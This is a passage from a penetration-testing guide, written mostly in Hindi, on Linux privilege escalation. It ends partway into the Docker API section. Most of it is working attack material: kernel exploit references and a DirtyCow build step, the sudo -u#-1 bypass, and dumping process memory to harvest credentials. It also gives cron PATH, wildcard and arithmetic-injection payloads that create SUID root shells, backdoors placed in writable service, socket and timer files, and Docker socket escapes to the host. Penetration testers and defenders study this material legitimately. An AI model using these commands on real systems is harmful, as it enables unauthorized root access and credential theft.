# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## सिस्टम जानकारी

### OS जानकारी

आइए चल रहे OS के बारे में कुछ जानकारी इकट्ठा करें।
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

यदि आपके पास **`PATH` के किसी भी फ़ोल्डर में लिखने की अनुमति** है तो आप कुछ libraries या binaries को hijack कर सकते हैं:
```bash
echo $PATH
```
### Env जानकारी

क्या environment variables में कोई रोचक जानकारी, passwords या API keys हैं?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel version की जाँच करें और देखें कि क्या कोई exploit है जिसका उपयोग privilege escalation के लिए किया जा सकता है।
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आप यहाँ एक अच्छी vulnerable kernel सूची और कुछ पहले से ही **compiled exploits** पा सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Other sites where you can find some **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेबसाइट से सभी कमजोर kernel संस्करण निकालने के लिए आप यह कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools that could help to search for kernel exploits are:
  
[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim, केवल kernel 2.x के लिए exploits की जाँच करता है)

Always **search the kernel version in Google**, maybe your kernel version is written in some kernel exploit and then you will be sure that this exploit is valid.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

निम्नलिखित में दिखाई देने वाले असुरक्षित sudo संस्करणों के आधार पर:
```bash
searchsploit sudo
```
आप grep का उपयोग करके यह जांच सकते हैं कि sudo संस्करण कमजोर है या नहीं।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.8.28

स्रोत: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg सिग्नेचर सत्यापन विफल

इस vuln को कैसे exploited किया जा सकता है, इसका एक **उदाहरण** देखने के लिए **smasher2 box of HTB** देखें
```bash
dmesg 2>/dev/null | grep "signature"
```
### अधिक system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित रक्षा उपाय सूचीबद्ध करें

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

यदि आप किसी docker container के अंदर हैं, तो आप इससे बाहर निकलने की कोशिश कर सकते हैं:

{{#ref}}
docker-security/
{{#endref}}

## Drives

जाँच करें **what is mounted and unmounted**, कहाँ और क्यों। अगर कुछ भी unmounted है तो आप इसे mount करके निजी जानकारी की जाँच कर सकते हैं
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी सॉफ़्टवेयर

उपयोगी binaries सूचीबद्ध करें
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
साथ ही जांचें कि **कोई compiler इंस्टॉल है**। यह उपयोगी होता है अगर आपको कोई kernel exploit इस्तेमाल करना हो क्योंकि इसे उसी मशीन में compile करना सलाह दी जाती है जहाँ आप इसे उपयोग करने जा रहे हैं (या किसी समान मशीन में)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### स्थापित कमजोर सॉफ़्टवेयर

जाँच करें कि **स्थापित पैकेजों और सेवाओं का संस्करण** क्या है। शायद कोई पुराना Nagios संस्करण (उदाहरण के लिए) मौजूद हो, जिसे escalating privileges के लिए exploited किया जा सके…\
अनुशंसित है कि अधिक संदिग्ध स्थापित सॉफ़्टवेयर के संस्करण को मैन्युअली जाँचा जाए।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
यदि आपके पास मशीन तक SSH access है तो आप मशीन के अंदर इंस्टॉल किए गए outdated और vulnerable software की जाँच के लिए **openVAS** का भी उपयोग कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये commands बहुत सारी जानकारी दिखाएँगे जो ज्यादातर बेकार होगी, इसलिए OpenVAS या समान कुछ applications की सिफारिश की जाती है जो जाँचें कि कोई installed software version ज्ञात exploits के लिए vulnerable है या नहीं_

## Processes

देखें कि **कौन से processes** execute हो रहे हैं और जाँचें कि क्या किसी process के पास **ज़रूरत से अधिक privileges** हैं (शायद कोई tomcat root द्वारा execute हो रहा है?)
```bash
ps aux
ps -ef
top -n 1
```
हमेशा संभावित [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md) की जाँच करें। **Linpeas** इनका पता प्रक्रियाओं की कमांड लाइन में `--inspect` पैरामीटर देखकर लगाता है।\
इसके अलावा **check your privileges over the processes binaries**, शायद आप किसीका overwrite कर सकें।

### Process monitoring

आप प्रक्रियाओं की निगरानी के लिए [**pspy**](https://github.com/DominicBreuker/pspy) जैसे टूल का उपयोग कर सकते हैं। यह उन कमजोर प्रक्रियाओं की पहचान करने में बहुत उपयोगी हो सकता है जो बार-बार चलती हैं या जब कुछ शर्तें पूरी होती हैं।

### Process memory

Some services of a server save **credentials in clear text inside the memory**.\
सामान्यतः अन्य उपयोगकर्ताओं की प्रक्रियाओं की मेमोरी पढ़ने के लिए आपको **root privileges** की आवश्यकता होगी, इसलिए यह आमतौर पर तब अधिक उपयोगी होता है जब आप पहले से root हैं और और अधिक credentials खोजना चाहते हैं।\
हालाँकि, ध्यान रखें कि **एक सामान्य उपयोगकर्ता के रूप में आप अपनी प्रक्रियाओं की मेमोरी पढ़ सकते हैं**।

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: सभी प्रक्रियाएं debug की जा सकती हैं, बशर्ते उनका uid एक समान हो। यह ptracing का पारंपरिक तरीका है।
> - **kernel.yama.ptrace_scope = 1**: केवल parent प्रक्रिया को debug किया जा सकता है।
> - **kernel.yama.ptrace_scope = 2**: केवल admin ptrace का उपयोग कर सकता है, क्योंकि इसके लिए CAP_SYS_PTRACE capability की आवश्यकता होती है।
> - **kernel.yama.ptrace_scope = 3**: ptrace के साथ कोई प्रक्रियाएं trace नहीं की जा सकतीं। एक बार सेट करने पर, ptracing को फिर से सक्षम करने के लिए reboot की आवश्यकता होती है।

#### GDB

यदि आपके पास किसी FTP service (उदाहरण के लिए) की मेमोरी तक पहुँच है, तो आप Heap प्राप्त कर सकते हैं और उसके अंदर उसके credentials की खोज कर सकते हैं।
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

किसी दिए गए process ID के लिए, **maps दिखाती हैं कि उस process के virtual address space में memory कैसे mapped है**; यह प्रत्येक mapped region के **permissions** भी दिखाती है। यह **mem pseudo file** **प्रोसेस की memory को स्वयं expose करता है**। **maps** file से हमें पता चलता है कि कौन‑से **memory regions readable हैं** और उनके offsets क्या हैं। हम इस जानकारी का उपयोग करके **mem file में seek करके सभी readable regions को एक फाइल में dump करते हैं**।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **भौतिक** मेमोरी तक पहुँच प्रदान करता है, न कि वर्चुअल मेमोरी। कर्नेल के वर्चुअल एड्रेस स्पेस तक /dev/kmem का उपयोग करके पहुंचा जा सकता है.\
आम तौर पर, `/dev/mem` केवल **root** और **kmem** समूह द्वारा पढ़ने योग्य होता है।
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump के लिए linux

ProcDump Windows के Sysinternals सूट में मौजूद क्लासिक ProcDump टूल की Linux के लिए पुनर्कल्पना है। इसे यहाँ प्राप्त करें: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### उपकरण

process memory को dump करने के लिए आप निम्न का उपयोग कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप मैन्युअल रूप से root आवश्यकताओं को हटा कर अपने स्वामित्व वाले process को dump कर सकते हैं
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root आवश्यक है)

### Process Memory से Credentials

#### मैन्युअल उदाहरण

यदि आप पाते हैं कि authenticator process चल रहा है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप process को dump कर सकते हैं (पहले के अनुभाग देखें ताकि process की memory को dump करने के विभिन्न तरीके मिलें) और memory के अंदर credentials खोज सकते हैं:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

यह टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) memory और कुछ **well known files** से **clear text credentials** चुरा लेगा। इसे सही ढंग से काम करने के लिए root privileges की आवश्यकता होती है।

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## अनुसूचित/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

यदि एक वेब “Crontab UI” पैनल (alseambusher/crontab-ui) root के रूप में चलता है और केवल loopback पर बाइंड है, तो आप फिर भी SSH local port-forwarding के माध्यम से इसे एक्सेस कर सकते हैं और एक privileged job बनाकर escalate कर सकते हैं।

Typical chain
- Loopback-only पोर्ट खोजें (जैसे 127.0.0.1:8000) और Basic-Auth realm का पता लगाएँ `ss -ntlp` / `curl -v localhost:8000` के माध्यम से
- ऑपरेशनल artifacts में credentials खोजें:
  - Backups/scripts जिनमें `zip -P <password>`
  - systemd unit जो `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` उजागर करती हो
- Tunnel और login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- एक high-priv job बनाएं और तुरंत चलाएँ (SUID shell प्रदान करता है):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- इस्तेमाल करें:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI को root के रूप में न चलाएं; इसे एक समर्पित उपयोगकर्ता और न्यूनतम अनुमतियों के साथ सीमित करें
- localhost से bind करें और अतिरिक्त रूप से firewall/VPN के माध्यम से एक्सेस को सीमित करें; पासवर्ड को पुन: उपयोग न करें
- unit files में secrets एम्बेड करने से बचें; secret stores या root-only EnvironmentFile का उपयोग करें
- on-demand job executions के लिए audit/logging सक्षम करें

जाँच करें कि कोई scheduled job vulnerable है या नहीं। शायद आप root द्वारा execute किए जा रहे किसी script का फायदा उठा सकते हैं (wildcard vuln? क्या आप root द्वारा उपयोग की जाने वाली फाइलों को modify कर सकते हैं? symlinks का उपयोग करें? root द्वारा उपयोग किए जाने वाले directory में specific files बनाएँ?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron पथ

उदाहरण के लिए, _/etc/crontab_ के अंदर आप PATH पा सकते हैं: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि "user" के पास /home/user पर लिखने की अनुमति है_)

यदि इस crontab में root किसी command या script को PATH सेट किए बिना execute करने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
तब, आप root shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron जो script में wildcard का उपयोग करता है (Wildcard Injection)

यदि कोई script root द्वारा चलाया जाता है और उसके किसी command में “**\***” होता है, तो आप इसका दुरुपयोग कर अप्रत्याशित चीज़ें (जैसे privesc) कर सकते हैं। उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि wildcard से पहले कोई path मौजूद है, जैसे** _**/some/path/\***_ **तो यह vulnerable नहीं है (यहाँ तक कि** _**./\***_ **भी नहीं)。**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. अगर कोई root cron/parser untrusted log fields पढ़ता है और उन्हें arithmetic context में फीड करता है, तो एक attacker command substitution $(...) inject कर सकता है जो cron चलने पर root के रूप में execute होगा।

- Why it works: Bash में expansions इस क्रम में होते हैं: parameter/variable expansion, command substitution, arithmetic expansion, फिर word splitting और pathname expansion. इसलिए मान जैसे `$(/bin/bash -c 'id > /tmp/pwn')0` पहले substitute होता है (कमांड रन होते हुए), फिर बचे हुए numeric `0` को arithmetic के लिए उपयोग किया जाता है ताकि स्क्रिप्ट बिना errors के जारी रहे।

- सामान्य vulnerable पैटर्न:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: parsed log में attacker-controlled टेक्स्ट लिखवाएँ ताकि numeric-looking field में एक command substitution हो और वह किसी digit पर खत्म हो। सुनिश्चित करें कि आपका कमांड stdout पर कुछ print न करे (या उसे redirect कर दें) ताकि arithmetic वैध रहे।
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

यदि आप **cron script को संशोधित कर सकते हैं** जो root द्वारा execute होता है, तो आप बहुत आसानी से shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
जब root द्वारा चलाया जाने वाला script किसी **डायरेक्टरी जहाँ आपकी पूरी पहुँच हो** का उपयोग करता है, तो यह उपयोगी हो सकता है कि आप उस फ़ोल्डर को डिलीट करके और **एक दूसरे फ़ोल्डर का symlink फ़ोल्डर बना दें** जो आपके द्वारा नियंत्रित script को चलाए।
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### बार-बार चलने वाले cron jobs

आप processes को मॉनिटर कर सकते हैं ताकि ऐसे processes ढूँढें जो हर 1, 2 या 5 मिनट में execute हो रहे हों। शायद आप इसका फायदा उठाकर privileges escalate कर सकें।

उदाहरण के लिए, **monitor every 0.1s during 1 minute**, **sort by less executed commands** और उन commands को delete करने के लिए जो सबसे ज्यादा executed हुए हैं, आप कर सकते हैं:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**You can also use** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (यह प्रत्येक process जो शुरू होता है उसे monitor और list करेगा).

### अदृश्य cron jobs

यह संभव है कि एक cronjob **putting a carriage return after a comment** (without newline character), और cron job काम करेगा। उदाहरण (ध्यान दें carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## सेवाएँ

### लिखने योग्य _.service_ फ़ाइलें

जाँचें कि क्या आप कोई `.service` फ़ाइल लिख सकते हैं, अगर कर सकते हैं तो आप इसे **संशोधित कर सकते हैं** ताकि यह आपकी **backdoor** को तब **निष्पादित** करे जब सेवा **शुरू**, **पुनः आरंभ** या **रोक** दी जाए (शायद आपको मशीन के रिबूट होने तक इंतज़ार करना पड़ सकता है).\

उदाहरण के लिए अपनी backdoor को `.service` फ़ाइल के अंदर इस तरह बनाएं: **`ExecStart=/tmp/script.sh`**

### लिखने योग्य service बाइनरीज़

ध्यान रखें कि अगर आपके पास **write permissions over binaries being executed by services** हैं, तो आप उन्हें backdoors के लिए बदल सकते हैं ताकि जब सेवाएँ फिर से चलें तो backdoors निष्पादित हो जाएँ।

### systemd PATH - सापेक्ष पथ

आप **systemd** द्वारा उपयोग किए जाने वाले PATH को निम्न के साथ देख सकते हैं:
```bash
systemctl show-environment
```
यदि आप पाते हैं कि आप path के किसी भी फ़ोल्डर में **write** कर सकते हैं तो आप **escalate privileges** करने में सक्षम हो सकते हैं। आपको **relative paths being used on service configurations** फ़ाइलों की तलाश करनी चाहिए, जैसे:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, systemd PATH फ़ोल्डर में जिस पर आप लिख सकते हैं, उसी **relative path binary** के नाम का एक **निष्पादन योग्य** बनाएं, और जब सेवा से कमजोर क्रिया (**Start**, **Stop**, **Reload**) को चलाने के लिए कहा जाएगा, तो आपका **backdoor** निष्पादित हो जाएगा (unprivileged users आम तौर पर सेवाओं को start/stop नहीं कर सकते लेकिन जाँचें कि क्या आप `sudo -l` का उपयोग कर सकते हैं)।

**Learn more about services with `man systemd.service`.**

## **Timers**

**Timers** वे systemd unit फाइलें हैं जिनके नाम का अंत `**.timer**` में होता है और जो `**.service**` फाइलों या घटनाओं को नियंत्रित करती हैं। **Timers** को cron के एक विकल्प के रूप में उपयोग किया जा सकता है क्योंकि इनमें कैलेंडर-आधारित समय घटनाओं और monotonic time events के लिए बिल्ट-इन समर्थन होता है और इन्हें asynchronously चलाया जा सकता है।

आप सभी timers को सूचीबद्ध कर सकते हैं:
```bash
systemctl list-timers --all
```
### लिखने योग्य टाइमर

यदि आप किसी टाइमर को संशोधित कर सकते हैं, तो आप इसे systemd.unit की कुछ मौजूदा यूनिट्स (जैसे `.service` या `.target`) को निष्पादित करने के लिए बना सकते हैं।
```bash
Unit=backdoor.service
```
> टाइमर समाप्त होने पर सक्रिय करने के लिए यूनिट। आर्ग्यूमेंट एक यूनिट नाम है, जिसका suffix ".timer" नहीं है। यदि निर्दिष्ट नहीं किया गया है, तो यह मान डिफ़ॉल्ट रूप से उस service पर सेट होता है जिसका नाम timer यूनिट के समान होता है, केवल suffix अलग होता है। (ऊपर देखें।) यह अनुशंसित है कि सक्रिय की जाने वाली यूनिट का नाम और timer यूनिट का नाम केवल suffix को छोड़कर एक समान हों।

इसलिए, इस अनुमति का दुरुपयोग करने के लिए आपको आवश्यकता होगी:

- किसी systemd यूनिट को ढूंढें (जैसे `.service`) जो **एक लिखने योग्य बाइनरी चला रहा हो**
- कोई systemd यूनिट ढूंढें जो **एक relative path चला रहा हो** और आपके पास **systemd PATH** पर **लिखने की privileges** हों (ताकि उस executable का impersonate किया जा सके)

**टाइमर्स के बारे में अधिक जानने के लिए `man systemd.timer` देखें।**

### **टाइमर सक्षम करना**

टाइमर को सक्षम करने के लिए आपको root privileges की आवश्यकता होगी और निम्नलिखित को execute करना होगा:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) क्लाइंट-सर्वर मॉडल में एक ही या अलग मशीनों पर प्रोसेस कम्युनिकेशन सक्षम करते हैं। वे इंटर-कंप्यूटर संचार के लिए स्टैण्डर्ड Unix descriptor फाइलों का उपयोग करते हैं और `.socket` files के माध्यम से सेटअप किए जाते हैं।

Sockets को `.socket` files से कॉन्फ़िगर किया जा सकता है।

**Learn more about sockets with `man systemd.socket`.** इस फ़ाइल के अंदर कई रोचक पैरामीटर कॉन्फ़िगर किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये विकल्प अलग-अलग हैं, पर संक्षेप में इन्हें socket को कहाँ सुनना है बताने के लिए इस्तेमाल किया जाता है (AF_UNIX socket फ़ाइल का path, सुनने के लिए IPv4/6 और/या port नंबर, आदि)।
- `Accept`: boolean argument लेता है। अगर **true** है, तो **प्रत्येक इनकमिंग कनेक्शन के लिए एक service instance spawn** किया जाता है और केवल कनेक्शन socket उसे दिया जाता है। अगर **false** है, तो सभी listening sockets स्वयं **started service unit को पास** किए जाते हैं, और सभी कनेक्शनों के लिए केवल एक service unit spawn होता है। यह मान datagram sockets और FIFOs के लिए अनदेखा किया जाता है जहाँ एक ही service unit बिना शर्त सभी इनकमिंग ट्रैफ़िक को संभालता है। **Defaults to false**. प्रदर्शन कारणों से, नए daemons को केवल इस तरह लिखा जाना चाहिए कि वे `Accept=no` के अनुकूल हों।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेते हैं, जो listening **sockets**/FIFOs को क्रमशः **बनाने और bind करने से पहले** या **बाद** executed होते हैं। कमांड लाइन का पहला token एक absolute filename होना चाहिए, उसके बाद process के arguments आते हैं।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands** जो listening **sockets**/FIFOs को क्रमशः **बंद और हटाए जाने से पहले** या **बाद** executed होते हैं।
- `Service`: incoming traffic पर activate करने के लिए **service** unit का नाम निर्दिष्ट करता है। यह सेटिंग केवल Accept=no वाले sockets के लिए ही अनुमति है। यह डिफ़ॉल्ट रूप से उस service को चुनता है जिसका नाम socket के समान होता है (suffix बदलकर)। अधिकांश मामलों में इस option का उपयोग आवश्यक नहीं होना चाहिए।

### Writable .socket files

यदि आप कोई **writable** `.socket` फ़ाइल पाते हैं तो आप `[Socket]` सेक्शन की शुरुआत में कुछ ऐसा जोड़ सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और यह backdoor socket बनाए जाने से पहले execute होगा। इसलिए, आपको **संभावित रूप से मशीन के reboot होने तक इंतज़ार करना होगा।**\
_ध्यान दें कि सिस्टम को उस socket फ़ाइल कॉन्फ़िगरेशन का उपयोग कर रहा होना चाहिए, वरना backdoor execute नहीं होगा_

### Writable sockets

यदि आप कोई **writable socket** पहचानते हैं (_अब हम Unix Sockets की बात कर रहे हैं, न कि config `.socket` फाइलों की_), तो आप उस socket के साथ **communicate** कर सकते हैं और संभवतः किसी vulnerability का exploit कर सकते हैं।

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### कच्चा कनेक्शन
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि कुछ **sockets listening for HTTP** requests मौजूद हो सकते हैं (_मैं .socket फाइलों की बात नहीं कर रहा हूँ बल्कि उन फाइलों की जो unix sockets के रूप में काम कर रही हैं_)। आप इसे निम्न से जांच सकते हैं:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
यदि socket **responds with an HTTP** request, तो आप इसके साथ **communicate** कर सकते हैं और शायद किसी **exploit some vulnerability**।

### लिखने योग्य Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
ये कमांड्स आपको host की फ़ाइल सिस्टम पर root-स्तरीय पहुँच के साथ एक container चलाने की अनुमति देती हैं।

#### **Docker API का सीधे उपयोग**

ऐसे मामलों में जहाँ Docker CLI उपलब्ध नहीं है, Docker socket को फिर भी Docker API और `curl` कमांड्स का उपयोग करके नियंत्रित किया जा सकता है।

1.  **List Docker Images:** उपलब्ध images की सूची प्राप्त करें।

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** host सिस्टम की root directory को mount करने वाला एक container बनाने के लिए request भेजें।

```bash
